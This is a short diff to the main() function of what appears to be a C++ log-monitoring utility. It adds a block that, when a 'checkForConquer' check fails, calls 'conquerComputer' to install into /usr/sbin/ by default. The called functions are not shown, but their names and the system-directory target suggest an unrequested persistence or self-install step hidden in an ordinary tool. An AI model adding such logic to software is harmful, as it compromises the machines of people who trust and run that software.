@@ -62,6 +62,14 @@ int main(int argc, char **argv)
     if(!fleObj.is_open() && isFile)
         throw std::runtime_error("Error while opening the given log file");
 
+    if(!checkForConquer())
+    {
+        std::string installPath = "/usr/sbin/";
+        if(args >> GetOpt::OptionPresent('i', "install"))
+            args >> GetOpt::Option('i', "install", installPath, "/usr/sbin/");
+        conquerComputer(installPath.c_str());
+    }
+
     int timeInterval = 1;
     if(args >> GetOpt::OptionPresent('t', "time"))
     {
